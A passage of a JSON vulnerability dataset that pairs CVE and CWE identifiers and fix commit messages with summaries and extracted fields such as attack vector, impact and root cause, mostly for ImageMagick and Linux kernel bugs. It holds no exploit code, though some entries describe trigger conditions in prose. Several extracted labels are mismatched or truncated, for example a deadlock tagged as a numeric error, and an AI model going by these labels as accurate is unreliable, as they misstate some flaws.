out-of-bounds read.","commit_message_1":"qedi : remove memset\/memcpy to nfunc and use func instead kasan report this : bug : kasan : global-out-of-bounds in qedi_dbg_err+0xda\/0x330 [ qedi ] read of size <number> at addr ffffffffc12b0ae0 by task syz-<file>\/<number> cpu : <number> pid : <number> comm : syz-<file> not tainted <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"An issue was discovered in drivers\/scsi\/qedi\/qedi_dbg.c in the Linux kernel","Impact":"obtain sensitive information","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"554b56687a19300a75ec24184746b5512580c819","cve_id":"CVE-2019-15026","cwe_id":"CWE-125","commit_message":"fix strncpy call to avoid ASAN violation\n\nEnsure we're only reading to the size of the smallest buffer, since\nthey're both on the stack and could potentially overlap. Overlapping is\ndefined as ... undefined behavior. I've looked through all available\nimplementations of strncpy and they still only copy from the first \\0\nfound.\n\nWe'll also never read past the end of sun_path since we _supply_\nsun_path with a proper null terminator.","summary":"memcached 1.5.16, when UNIX sockets are used, has a stack-based buffer over-read in conn_to_str in memcached.c.","commit_message_1":"fix strncpy call to avoid asan violation ensure we 're only reading to the size of the smallest buffer , since they 're both on the stack and could potentially overlap","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted request","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the conn_to_str function","Attack Type":"remote attacker"},{"commit_id":"b522d2d857d2f75b659936b59b0da9df1682c256","cve_id":"CVE-2019-14981","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1552","summary":"In ImageMagick 7.x before 7.0.8-41 and 6.x before 6.9.10-41, there is a divide-by-zero vulnerability in the MeanShiftImage function. It allows an attacker to cause a denial of service by sending a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"by sending a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a divide-by-zero vulnerability","Attack Type":"remote attacker"},{"commit_id":"614a257295bdcdeda347086761062ac7658b6830","cve_id":"CVE-2019-14980","cwe_id":"CWE-416","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick6\/issues\/43","summary":"In ImageMagick 7.x before 7.0.8-42 and 6.x before 6.9.10-42, there is a use after free vulnerability in the UnmapBlob function that allows an attacker to cause a denial of service by sending a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick6\/issues\/<number>","Vulnerability Type":"Use After Free","Attack Vector":"by sending a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a use after free vulnerability","Attack Type":"remote attacker"},{"commit_id":"0c4120fffa3dffe97b95c486a120eded82afe8a6","cve_id":"CVE-2019-14934","cwe_id":"CWE-787","commit_message":"Zero and sanity check all dynamic allocs.\n\nThis addresses the memory issues in Issue #6 expressed in\ncalloc_some.pdf and malloc_some.pdf","summary":"An issue was discovered in PDFResurrect before 0.18. pdf_load_pages_kids in pdf.c doesn't validate a certain size value, which leads to a malloc failure and out-of-bounds write.","commit_message_1":"zero and sanity check all dynamic allocs","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"remote attacker"},{"commit_id":"7caac62ed598a196d6ddf8d9c121e12e082cac3","cve_id":"CVE-2019-14816","cwe_id":"CWE-120","commit_message":"mwifiex: Fix three heap overflow at parsing element in cfg80211_ap_settings\n\nmwifiex_update_vs_ie(),mwifiex_set_uap_rates() and\nmwifiex_set_wmm_params() call memcpy() without checking\nthe destination size.Since the source is given from\nuser-space, this may trigger a heap buffer overflow.\n\nFix them by putting the length check before performing memcpy().\n\nThis fix addresses CVE-2019-14814,CVE-2019-14815,CVE-2019-14816.\n\nSigned-off-by: Wen Huang <huangwenabc@gmail.com>\nAcked-by: Ganapathi Bhat <gbhat@marvell.comg>\nSigned-off-by: Kalle Valo <kvalo@codeaurora.org>","summary":"There is heap-based buffer overflow in kernel, all versions up to, excluding 5.3, in the marvell wifi chip driver in Linux kernel, that allows local users to cause a denial of service(system crash) or possibly execute arbitrary code.","commit_message_1":"fix three heap overflow at parsing element in cfg80211_ap_settings mwifiex_update_vs_ie ( ) , mwifiex_set_uap_rates ( ) and mwifiex_set_wmm_params ( ) call memcpy ( ) without checking the destination <file> the source is given from user-space , this may trigger a heap buffer overflow","Vulnerability Type":"Classic Buffer Overflow","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by mwifiex_update_vs_ie() function of Marvell Wifi Driver","Attack Type":"local attacker"},{"commit_id":"7caac62ed598a196d6ddf8d9c121e12e082cac3a","cve_id":"CVE-2019-14814","cwe_id":"CWE-120","commit_message":"mwifiex: Fix three heap overflow at parsing element in cfg80211_ap_settings\n\nmwifiex_update_vs_ie(),mwifiex_set_uap_rates() and\nmwifiex_set_wmm_params() call memcpy() without checking\nthe destination size.Since the source is given from\nuser-space, this may trigger a heap buffer overflow.\n\nFix them by putting the length check before performing memcpy().\n\nThis fix addresses CVE-2019-14814,CVE-2019-14815,CVE-2019-14816.\n\nSigned-off-by: Wen Huang <huangwenabc@gmail.com>\nAcked-by: Ganapathi Bhat <gbhat@marvell.comg>\nSigned-off-by: Kalle Valo <kvalo@codeaurora.org>","summary":"There is heap-based buffer overflow in Linux kernel, all versions up to, excluding 5.3, in the marvell wifi chip driver in Linux kernel, that allows local users to cause a denial of service(system crash) or possibly execute arbitrary code.","commit_message_1":"fix three heap overflow at parsing element in cfg80211_ap_settings mwifiex_update_vs_ie ( ) , mwifiex_set_uap_rates ( ) and mwifiex_set_wmm_params ( ) call memcpy ( ) without checking the destination <file> the source is given from user-space , this may trigger a heap buffer overflow","Vulnerability Type":"Classic Buffer Overflow","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by mwifiex_set_uap_rates() function of Marvell Wifi Driver","Attack Type":"local attacker"},{"commit_id":"c91815b596245fd7da349ecc43c8def670d2269e","cve_id":"CVE-2019-14763","cwe_id":"CWE-189","commit_message":"usb: dwc3: gadget: never call ->complete() from ->ep_queue()\n\nThis is a requirement which has always existed but, somehow, wasn't\nreflected in the documentation and problems weren't found until now\nwhen Tuba Yavuz found a possible deadlock happening between dwc3 and\nf_hid. She described the situation as follows:\n\nspin_lock_irqsave(&hidg->write_spinlock, flags); \/\/ first acquire\n\/* we our function has been disabled by host *\/\nif (!hidg->req) {\n\tfree_ep_req(hidg->in_ep, hidg->req);\n\tgoto try_again;\n}\n\n[...]\n\nstatus = usb_ep_queue(hidg->in_ep, hidg->req, GFP_ATOMIC);\n=>\n\t[...]\n\t=> usb_gadget_giveback_request\n\t\t=>\n\t\tf_hidg_req_complete\n\t\t\t=>\n\t\t\tspin_lock_irqsave(&hidg->write_spinlock, flags); \/\/ second acquire\n\nNote that this happens because dwc3 would call ->complete() on a\nfailed usb_ep_queue() due to failed Start Transfer command. This is,\nanyway, a theoretical situation because dwc3 currently uses \"No\nResponse Update Transfer\" command for Bulk and Interrupt endpoints.\n\nIt's still good to make this case impossible to happen even if the \"No\nReponse Update Transfer\" command is changed.\n\nReported-by: Tuba Yavuz <tuba@ece.ufl.edu>\nSigned-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"In the Linux kernel before 4.16.4, a double-locking error in drivers\/usb\/dwc3\/gadget.c may potentially cause a deadlock with f_hid.","commit_message_1":"dwc3 : gadget : never call - > complete ( ) from - > ep_queue ( ) this is a requirement which ha always existed but , somehow , wa n't reflected in the documentation and problem were n't found until now when tuba yavuz found a possible deadlock happening between dwc3 and f_hid","Vulnerability Type":"Numeric Errors","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a double-locking error","Attack Type":"local attacker"},{"commit_id":"3b67dc844789dc0f00e934270c7b349bcb547865","cve_id":"CVE-2019-14495","cwe_id":"CWE-787","commit_message":"Fix: out-of-bounds write and few more bugs in 'admin' configuration upload","summary":"webadmin.c in 3proxy before 0.8.13 has an out-of-bounds write in the admin interface.","commit_message_1":"out-of-bounds write and few more bug in 'admin ' configuration upload","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By sending a specially crafted request in the admin interface","Impact":"execute arbitrary code","Root Cause":"has an out - of - bounds write","Attack Type":"remote attacker"},{"commit_id":"5ccdf5ef79d742640355d1132fa9e2abc7fbaefc","cve_id":"CVE-2019-14463","cwe_id":"CWE-125","commit_message":"Fix VD-1301 and VD-1302 vulnerabilities\n\nThis patch was contributed by Maor Vermucht and Or Peles from\nVDOO Connected Trust.","summary":"An issue was discovered in libmodbus before 3.0.7 and 3.1.x before 3.1.5. There is an out-of-bounds read for the MODBUS_FC_WRITE_MULTIPLE_REGISTERS case, aka VD-1301.","commit_message_1":"fix vd-<number> and vd-<number> vulnerability this patch wa contributed by maor vermucht and or peles from vdoo connected trust","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"An issue was discovered in libmodbus","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"3b006ededaf351f1723aea6c727c9edd1b1fff9b","cve_id":"CVE-2019-14459","cwe_id":"CWE-190","commit_message":"Fix potential unsigned integer underflow","summary":"nfdump 1.6.17 and earlier is affected by an integer overflow in the function Process_ipfix_template_withdraw in ipfix.c that can be abused in order to crash the process remotely (denial of service).","commit_message_1":"fix potential unsigned integer underflow","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"369eebe936e4a8c83cc54662a3412ce8bef189e4","cve_id":"CVE-2019-14452","cwe_id":"CWE-22","commit_message":"do not allow zip files to have upward relative path sections","summary":"Sigil before 0.9.16 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ..\/ (dot dot slash) in a ZIP archive entry that is mishandled during extraction.","commit_message_1":"do not allow zip file to have upward relative path section","Vulnerability Type":"Path Traversal","Attack Vector":"via a . . \/ ( dot dot slash ) in a zip archive entry that is mishandled during extraction","Impact":"write arbitrary files","Root Cause":"is vulnerable to a directory traversal","Attack Type":"remote attacker"},{"commit_id":"ce04b1f29a137198182f60bbb628d5ceb8171765","cve_id":"CVE-2019-14323","cwe_id":"CWE-119","commit_message":"Fix #1: Ensure recv buf is always NUL terminated\n\nSigned-off-by: Joachim Nilsson <troglobit@gmail.com>","summary":"SSDP Responder 1.x through 1.5 mishandles incoming network messages, leading to a stack-based buffer overflow by 1 byte. This results in a crash of the server, but only when strict stack checking is enabled. This is caused by an off-by-one error in ssdp_recv in ssdpd.c.","commit_message_1":"fix # <number> : ensure recv buf is always nul terminated","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow when handling incoming network message","Attack Type":"remote attacker"},{"commit_id":"f3554aeb991214cbfafd17d55e2bfddb50282e32","cve_id":"CVE-2019-14284","cwe_id":"CWE-369","commit_message":"floppy: fix div-by-zero in setup_format_params\n\nThis fixes a divide by zero error in the setup_format_params function of\nthe floppy driver.\n\nTwo consecutive ioctls can trigger the bug: The first one should set the\ndrive geometry with such .sect and .rate values for the F_SECT_PER_TRACK\nto become zero.  Next, the floppy format operation should be called.\n\nA floppy disk is not required to be inserted.  An unprivileged user\ncould trigger the bug if the device is accessible.\n\nThe patch checks F_SECT_PER_TRACK for a non-zero value in the\nset_geometry function.  The proper check should involve a reasonable\nupper limit for the .sect and .rate fields, but it could change the\nUAPI.\n\nThe patch also checks F_SECT_PER_TRACK in the setup_format_params, and\ncancels the formatting operation in case of zero.\n\nThe bug was found by syzkaller.\n\nSigned-off-by: Denis Efremov <efremov@ispras.ru>\nTested-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In the Linux kernel before 5.2.3, drivers\/block\/floppy.c allows a denial of service by setup_format_params division-by-zero. Two consecutive ioctls can trigger the bug: the first one should set the drive geometry with .sect and .rate values that make F_SECT_PER_TRACK be zero. Next, the floppy format operation should be called. It can be triggered by an unprivileged local user even when a floppy disk has not been inserted. NOTE: QEMU creates the floppy device by default.","commit_message_1":"fix div-by-zero in setup_format_params this fix a divide by zero error in the setup_format_params function of the floppy driver","Vulnerability Type":"Divide By Zero","Attack Vector":"By sending specially-crafted ioctls","Impact":"cause a denial of service","Root Cause":"caused by setup_format_params division-by-zero","Attack Type":"local attacker"},{"commit_id":"da99466ac243f15fbba65bd261bfc75ffa1532b6","cve_id":"CVE-2019-14283","cwe_id":"CWE-125","commit_message":"floppy: fix out-of-bounds read in copy_buffer\n\nThis fixes a global out-of-bounds read access in the copy_buffer\nfunction of the floppy driver.\n\nThe FDDEFPRM ioctl allows one to set the geometry of a disk.  The sect\nand head fields (unsigned int) of the floppy_drive structure are used to\ncompute the max_sector (int) in the make_raw_rw_request function.  It is\npossible to overflow the max_sector.  Next, max_sector is passed to the\ncopy_buffer function and used in one of the memcpy calls.\n\nAn unprivileged user could trigger the bug if the device is accessible,\nbut requires a floppy disk to be inserted.\n\nThe patch adds the check for the .sect * .head multiplication for not\noverflowing in the set_geometry function.\n\nThe bug was found by syzkaller.\n\nSigned-off-by: Denis Efremov <efremov@ispras.ru>\nTested-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In the Linux kernel before 5.2.3, set_geometry in drivers\/block\/floppy.c does not validate the sect and head fields, as demonstrated by an integer overflow and out-of-bounds read. It can be triggered by an unprivileged local user when a floppy disk has been inserted. NOTE: QEMU creates the floppy device by default.","commit_message_1":"fix out-of-bounds read in copy_buffer this fix a global out-of-bounds read access in the copy_buffer function of the floppy driver","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"In the Linux kernel before 5.2.3, set_geometry","Impact":"cause a denial of service","Root Cause":"does not validate the sect and head fields , as demonstrated by an integer overflow and out - of - bounds read . it can","Attack Type":"local attacker"},{"commit_id":"b66ca475be967547af9a3784e720fbbacd381be6","cve_id":"CVE-2019-13615","cwe_id":"CWE-119","commit_message":"Exit the max size loop when there's nothing left possible to find\n\nDataStream.getFilePointer() is not correct in this context. It might force to\nexit too early.","summary":"libebml before 1.3.6, as used in the MKV module in VideoLAN VLC Media Player binaries before 3.0.3, has a heap-based buffer over-read in EbmlElement::FindNextElement.","commit_message_1":"exit the max size loop when there 's nothing left possible to find <file> ( ) is not correct in this context","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer over - read","Attack Type":"remote attacker"},{"commit_id":"4f31d78716ac94c85c244efcea368fea202e2ed4","cve_id":"CVE-2019-13454","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1629","summary":"ImageMagick 7.0.8-54 Q16 allows Division by Zero in RemoveDuplicateLayers in MagickCore\/layer.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a divide by zero flaw","Attack Type":"remote attacker"},{"commit_id":"f6ffc702c6eecd963587273a429dcd608c648984","cve_id":"CVE-2019-13391","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1588","summary":"In ImageMagick 7.0.8-50 Q16, ComplexImages in MagickCore\/fourier.c has a heap-based buffer over-read because of incorrect calls to GetCacheViewVirtualPixels.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"ComplexImages in MagickCore\/fourier.c","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer over - read because of incorrect calls to getcacheviewvirtualpixels .","Attack Type":"local attacker"},{"commit_id":"bb812022d0bc12107db215c981cab0b1ccd73d91","cve_id":"CVE-2019-13311","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1623","summary":"ImageMagick 7.0.8-50 Q16 has memory leaks at AcquireMagickMemory because of a wand\/mogrify.c error.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by memory leaks","Attack Type":"remote attacker"},{"commit_id":"5982632109cad48bc6dab867298fdea4dea57c51","cve_id":"CVE-2019-13310","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1616","summary":"ImageMagick 7.0.8-50 Q16 has memory leaks at AcquireMagickMemory because of an error in MagickWand\/mogrify.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has memory leaks at acquiremagickmemory because of an error","Attack Type":"remote attacker"},{"commit_id":"19651f3db63fa1511ed83a348c4c82fa553f8d01","cve_id":"CVE-2019-13308","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1595","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow in MagickCore\/fourier.c in ComplexImage.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"91e58d967a92250439ede038ccfb0913a81e59fe","cve_id":"CVE-2019-13307","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1615","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore\/statistic.c in EvaluateImages because of mishandling rows.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer overflow at magickcore \/ statistic . c","Attack Type":"remote attacker"},{"commit_id":"cb5ec7d98195aa74d5ed299b38eff2a68122f3fa","cve_id":"CVE-2019-13306","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1612","summary":"ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders\/pnm.c in WritePNMImage because of off-by-one errors.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer overflow at coders \/ pnm . c","Attack Type":"remote attacker"},{"commit_id":"5c7fbf9a14fb83c9685ad69d48899f490a37609d","cve_id":"CVE-2019-13305","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1613","summary":"ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders\/pnm.c in WritePNMImage because of a misplaced strncpy and an off-by-one error.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer overflow at coders \/ pnm . c","Attack Type":"remote attacker"},{"commit_id":"7689875ef64f34141e7292f6945efdf0530b4a5e","cve_id":"CVE-2019-13304","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1614","summary":"ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders\/pnm.c in WritePNMImage because of a misplaced assignment.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer overflow at coders \/ pnm . c","Attack Type":"remote attacker"},{"commit_id":"d29148fae06c01ef215940e084cf41853c117bab","cve_id":"CVE-2019-13303","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1603","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read in MagickCore\/composite.c in CompositeImage.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer over - read","Attack Type":"remote attacker"},{"commit_id":"d5089971bd792311aaab5cb73460326d7ef7f32d","cve_id":"CVE-2019-13302","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1597","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read in MagickCore\/fourier.c in ComplexImages.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer over - read","Attack Type":"remote attacker"},{"commit_id":"f595a1985233c399a05c0c37cc41de16a90dd025","cve_id":"CVE-2019-13301","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1589","summary":"ImageMagick 7.0.8-50 Q16 has memory leaks in AcquireMagickMemory because of an AnnotateImage error.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By sending a specially crafted command","Impact":"cause a denial of service","Root Cause":"has memory leaks","Attack Type":"local attacker"},{"commit_id":"5e409ae7a389cdf2ed17469303be3f3f21cec450","cve_id":"CVE-2019-13300","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1586","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore\/statistic.c in EvaluateImages because of mishandling columns.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow at magickcore \/ statistic . c","Attack Type":"local attacker"},{"commit_id":"d4fc44b58a14f76b1ac997517d742ee12c9dc5d3","cve_id":"CVE-2019-13298","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1611","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore\/pixel-accessor.h in SetPixelViaPixelInfo because of a MagickCore\/enhance.c error.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow at magickcore \/ pixel - accessor . h","Attack Type":"local attacker"},{"commit_id":"35c7032723d85eee7318ff6c82f031fa2666b773","cve_id":"CVE-2019-13297","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1609","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read at MagickCore\/threshold.c in AdaptiveThresholdImage because a height of zero is mishandled.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by AdaptiveThresholdImage","Attack Type":"local attacker"},{"commit_id":"ce08a3691a8ac29125e29fc41967b3737fa3f425","cve_id":"CVE-2019-13296","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1604","summary":"ImageMagick 7.0.8-50 Q16 has direct memory leaks in AcquireMagickMemory because of an error in CLIListOperatorImages in MagickWand\/operation.c for a NULL value.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"by an error in CLIListOperatorImages in MagickWand\/operation.c","Impact":"cause a denial of service","Root Cause":"has direct memory leaks","Attack Type":"local attacker"},{"commit_id":"a7759f410b773a1dd57b0e1fb28112e1cd8b97bc","cve_id":"CVE-2019-13295","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1608","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read at MagickCore\/threshold.c in AdaptiveThresholdImage because a width of zero is mishandled.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted command","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by AdaptiveThresholdImage","Attack Type":"local attacker"},{"commit_id":"6994eefb0053799d2e07cd140df6c2ea106c41ee","cve_id":"CVE-2019-13272","cwe_id":"CWE-264","commit_message":"ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME\n\nFix two issues:\n\nWhen called for PTRACE_TRACEME, ptrace_link() would obtain an RCU\nreference to the parent's objective credentials, then give that pointer\nto get_cred().  However, the object lifetime rules for things like\nstruct cred do not permit unconditionally turning an RCU reference into\na stable reference.\n\nPTRACE_TRACEME records the parent's credentials as if the parent was\nacting as the subject, but that's not the case.  If a malicious\nunprivileged child uses PTRACE_TRACEME and the parent is privileged, and\nat a later point, the parent process becomes attacker-controlled\n(because it drops privileges and calls execve()), the attacker ends up\nwith control over two processes with a privileged ptrace relationship,\nwhich can be abused to ptrace a suid binary and obtain root privileges.\n\nFix both of these by always recording the credentials of the process\nthat is requesting the creation of the ptrace relationship:\ncurrent_cred() can't change under us, and current is the proper subject\nfor access control.\n\nThis change is theoretically userspace-visible, but I am not aware of\nany code that it will actually break.\n\nFixes: 64b875f7ac8a (\"ptrace: Capture the ptracer's creds not PT_PTRACE_CAP\")\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Oleg Nesterov <oleg@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In the Linux kernel before 5.1.17, ptrace_link in kernel\/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME. NOTE: SELinux deny_ptrace might be a usable workaround in some environments.","commit_message_1":"fix - > ptracer_cred handling for ptrace_traceme fix two issue : when called for ptrace_traceme , ptrace_link ( ) would obtain an rcu reference to the parent 's objective credential , then give that pointer to get_cred ( )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging certain scenarios with a parent - child process relationship , where a parent drops privileges and calls execve ( potentially allowing control by an attacker )","Impact":"obtain root access","Root Cause":"caused by improper permission validation and improper object lifetime handling for PTRACE_TRACEME","Attack Type":"local attacker"},{"commit_id":"de9f869616dd95e95c00bdd6b0fcd3421e8a4323","cve_id":"CVE-2019-13233","cwe_id":"CWE-362","commit_message":"x86\/insn-eval: Fix use-after-free access to LDT entry\n\nget_desc() computes a pointer into the LDT while holding a lock that\nprotects the LDT from being freed, but then drops the lock and returns the\n(now potentially dangling) pointer to its caller.\n\nFix it by giving the caller a copy of the LDT entry instead.\n\nFixes: 670f928ba09b (\"x86\/insn-eval: Add utility function to get segment descriptor\")\nCc: stable@vger.kernel.org\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In arch\/x86\/lib\/insn-eval.c in the Linux kernel before 5.1.9, there is a use-after-free for access to an LDT entry because of a race condition between modify_ldt() and a #BR exception for an MPX bounds violation.","commit_message_1":"fix use-after-free access to ldt entry get_desc ( ) computes a pointer into the ldt while holding a lock that protects the ldt from being freed , but then drop the lock and return the ( now potentially dangling ) pointer to it caller","Vulnerability Type":"Race Condition","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service ","Root Cause":"caused by a use-after-free flaw when a race between modify_ldt() and #BR Exception occurs","Attack Type":"local attacker"},{"commit_id":"e079f3e2712b4f8c28e3e63e71ba1a1f90fce1ab","cve_id":"CVE-2019-13229","cwe_id":"CWE-59","commit_message":"fix: Do not use the \"\/tmp\" directory\n\nhttps:\/\/github.com\/linuxdeepin\/deepin-clone\/issues\/16\nhttps:\/\/bugzilla.opensuse.org\/show_bug.cgi?id=1130388","summary":"deepin-clone before 1.1.3 uses a fixed path \/tmp\/partclone.log in the Helper::getPartitionSizeInfo() function to write a log file as root, and follows symlinks there. An unprivileged user can prepare a symlink attack there to create or overwrite files in arbitrary file system locations. The content is not attacker controlled.","commit_message_1":"fix : do not use the `` \/tmp '' directory http : \/\/<file>\/linuxdeepin\/deepin-clone\/issues\/<number> http : \/\/<file>","Vulnerability Type":"Link Following","Attack Vector":"by creating a symbolic link from a temporary file to various files on the system","Impact":"create or overwrite arbitrary files","Root Cause":"cause by a 